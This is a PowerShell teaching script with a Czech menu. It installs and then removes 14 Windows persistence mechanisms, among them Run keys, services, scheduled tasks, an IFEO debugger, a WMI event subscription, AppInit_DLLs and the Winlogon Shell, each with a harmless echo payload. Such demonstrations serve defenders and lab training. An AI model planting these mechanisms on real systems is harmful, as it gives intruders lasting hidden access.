# For educational purposes only. Use responsibly and ethically.
# This script demonstrates various persistence techniques in Windows.
# It is intended for security professionals and ethical hackers to understand how persistence works.
# Ensure you run this script with administrative privileges.
# Disclaimer: Unauthorized use of this script may violate laws and regulations. Always obtain permission before testing on any system.

<#
.SYNOPSIS
    Windows Persistence Techniques Demonstration Script
.DESCRIPTION
    This script demonstrates various persistence techniques that can be used by attackers to maintain access to a system.
    Each technique is implemented in a safe way for educational purposes.
    The script includes both user-level and system-level persistence methods.
.NOTES
    Created by: Hack3r.cz
    For educational purposes only.
    Always obtain proper authorization before testing on any system.
#>

function Test-Administrator {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Require-Administrator {
    if (-not (Test-Administrator)) {
        Write-Host "Tato funkce vyzaduje administrativni prava. Spuste skript jako administrator." -ForegroundColor Red
        return $false
    }
    return $true
}

function Show-Menu {
    Clear-Host
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
    Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
    Write-Host "  For educational purposes only." -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
    Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
    Write-Host "Zkontrolujte, ze mate administrativni prava pro spusteni tohoto skriptu." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Vyberte techniku perzistence, kterou chcete otestovat:" -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "1) Sluzba (Service) (as admin)"
    Write-Host "2) Startup (vlastni profil)"
    Write-Host "3) Startup (vsichni uzivatele) (as admin)"
    Write-Host "4) Run klic v HKCU (HKEY_CURRENT_USER)"
    Write-Host "5) Run klic v HKLM (HKEY_LOCAL_MACHINE) (as admin)"
    Write-Host "6) Run klic pro 32bitove aplikace v HKLM (HKEY_LOCAL_MACHINE WOW6432Node) (as admin)"
    Write-Host "7) Planovana uloha (Scheduled Task)"
    Write-Host "8) Debugger (Image File Execution Options) (as admin)"
    Write-Host "9) WMI Filtr (WMI Filter) (as admin)"
    Write-Host "10) Logon Script"
    Write-Host "11) AppInit_DLLs (as admin)"
    Write-Host "12) Screensaver"
    Write-Host "13) Office Test"
    Write-Host "14) Winlogon Shell (as admin)"
    Write-Host "99) Odstranit vsechny persistence techniky"
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Zadejte cislo moznosti (1-14 nebo 99 pro odstraneni)" -ForegroundColor Yellow
    Write-Host "Poznamka: Polozky oznacene jako '(as admin)' vyzaduji spusteni skriptu s administrativnimi pravy." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
}

Clear-Host
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
Write-Host "  For educational purposes only." -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

# Check if running as administrator
if (-not (Test-Administrator)) {
    Write-Host "POZOR: Tento skript vyzaduje administrativni prava pro nektere funkce." -ForegroundColor Red
    Write-Host "Pro plnou funkcionalitu spuste tento skript jako administrator." -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Cyan
}

$confirmation = Read-Host "Chcete pokracovat? (Ano/Ne)"
if ($confirmation -ne "Ano" -and $confirmation -ne "ano") {
    Write-Host "Skript byl ukoncen uzivatelem." -ForegroundColor Red
    exit
}

do {
    Show-Menu
    $choice = Read-Host "Vase volba"

    if (-not ($choice -match '^\d+$')) {
        Write-Host "Neplatna volba. Zkuste to znovu." -ForegroundColor Red
        Start-Sleep -Seconds 2
        continue
    }

    switch ($choice) {
        1 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim sluzbu 'Demo', ktera spousti cmd /c cmd /k echo Spustena sluzba"
            $serviceName = "Demo"
            $binPath = "cmd.exe /c cmd /k echo Spustena sluzba"
            sc.exe create $serviceName binPath= "$binPath" start= auto | Out-Null
            Write-Host "Sluzba 'Demo' byla vytvorena."
        }
        2 { 
            Write-Host "Startup (vlastni profil): Zkontrolujte '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve vlasnim profilu ve startup slozce.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve vasem Startup."
        }
        3 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Startup (vsichni uzivatele): Zkontrolujte 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve startup slozce pro vsechny uzivatele.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve Startup vsech uzivatelu."
        }
        4 { 
            Write-Host "Run klic v HKCU: Zkontrolujte 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ."
        }
        5 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic v HKLM: Zkontrolujte 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM."
        }
        6 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic pro 32bitove aplikace v HKLM: Zkontrolujte 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = '%SystemRoot%\SysWOW64\cmd.exe /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM WOW6432Node."
        }
        7 { 
            Write-Host "Vytvarim novou naplanovanou ulohu, ktera se spusti kazdych 30 minut."
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/k echo Me spustila pravidelna uloha"
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).Date
            $taskName = "Demo30MinTask"
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
            Write-Host "Naplanovana uloha '$taskName' byla vytvorena."
        }
        8 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Debugger: Zkontrolujte klic 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'."
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe"
            $valueName = "Debugger"
            $valueData = 'cmd /k echo Me spustila perzistence z debuggeru a tady lze spustit cokoli poc uctem: %username%'
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $regPath a hodnota $valueName typu REG_SZ."
        }
        9 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim WMI filtr, consumer a jejich propojeni..."
            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
                EventNamespace = 'root/cimv2'
                Name = "DetektorOdhalovaniNapadeni"
                Query = "select * from win32_processstarttrace where processname = 'procexp.exe' or processname = 'procexp64.exe' or processname = 'charmap.exe' or processname = 'tasksmgr.exe'"
                QueryLanguage = 'WQL'
            }
            $Command = "cmd /k echo Prave jsme detekovali zmenu a spoustime: extrakci dat/sifrovani/skryvani - ukoncovani aktivnich procesu atd. ..."
            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = "HlidacKlicovychProcesu"
                CommandLineTemplate = $Command
            }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $Filter
                Consumer = $Consumer
            } | Out-Null
            Write-Host "WMI filtr, consumer a propojeni byly vytvoreny."
        }
        10 {
            # Logon Scripts are executed when a user logs into the system
            # This technique uses the UserInitMprLogonScript registry key
            Write-Host "Logon Script: Zkontrolujte 'HKCU:\Environment'."
            $regPath = "HKCU:\Environment"
            $valueName = "UserInitMprLogonScript"
            $valueData = 'cmd /k echo Spusten logon script'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
        }
        11 {
            # AppInit_DLLs are loaded by every process that loads User32.dll
            # This technique modifies the AppInit_DLLs registry key
            if (-not (Require-Administrator)) { break }
            Write-Host "AppInit_DLLs: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
            $valueName = "AppInit_DLLs"
            $valueData = "cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
        }
        12 {
            # Screensaver persistence replaces the screensaver executable
            # When the screensaver activates, the malicious code will run
            Write-Host "Screensaver: Zkontrolujte 'HKCU:\Control Panel\Desktop'."
            $regPath = "HKCU:\Control Panel\Desktop"
            $valueName = "SCRNSAVE.EXE"
            $valueData = "cmd.exe"
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
        }
        13 {
            # Office Test persistence leverages a Microsoft Office vulnerability
            # It creates a registry key that Office applications check on startup
            Write-Host "Office Test: Zkontrolujte 'HKCU:\Software\Microsoft\Office test\Special\Perf'."
            $regPath = "HKCU:\Software\Microsoft\Office test\Special\Perf"
            $valueData = "cmd.exe"
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "(Default)" -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic pro Office Test."
        }
        14 {
            # Winlogon Shell persistence modifies the shell that is executed at logon
            # This technique changes the shell from explorer.exe to include additional commands
            if (-not (Require-Administrator)) { break }
            Write-Host "Winlogon Shell: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
            $valueName = "Shell"
            $valueData = "explorer.exe,cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
        }
        99 {
            # Cleanup function to remove all persistence techniques
            # This ensures that the system is returned to its original state
            if (-not (Require-Administrator)) { break }
            Write-Host "Odstranuji vsechny persistence techniky..."


            sc.exe stop Demo | Out-Null
            sc.exe delete Demo | Out-Null


            Remove-Item -Path (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue
            Remove-Item -Path (Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") -ErrorAction SilentlyContinue


            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue


            Unregister-ScheduledTask -TaskName "Demo30MinTask" -Confirm:$false -ErrorAction SilentlyContinue


            Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe" -Recurse -Force -ErrorAction SilentlyContinue


            $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq "DetektorOdhalovaniNapadeni" }
            if ($filter) { $filter.Delete() }
            $consumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "HlidacKlicovychProcesu" }
            if ($consumer) { $consumer.Delete() }
            $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like "*DetektorOdhalovaniNapadeni*" -or $_.Consumer -like "*HlidacKlicovychProcesu*" }
            foreach ($b in $bindings) { $b.Delete() }


            Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -ErrorAction SilentlyContinue
            Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue
            Remove-Item -Path "HKCU:\Software\Microsoft\Office test" -Recurse -Force -ErrorAction SilentlyContinue
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe" -ErrorAction SilentlyContinue

            Write-Host "Vsechny persistence techniky byly odstraneny."
        }
        Default { Write-Host "Neplatna volba." }
    }

    Write-Host ""
    Write-Host "Stisknete Enter pro navrat do menu..."
    [void][System.Console]::ReadLine()
} while ($true)
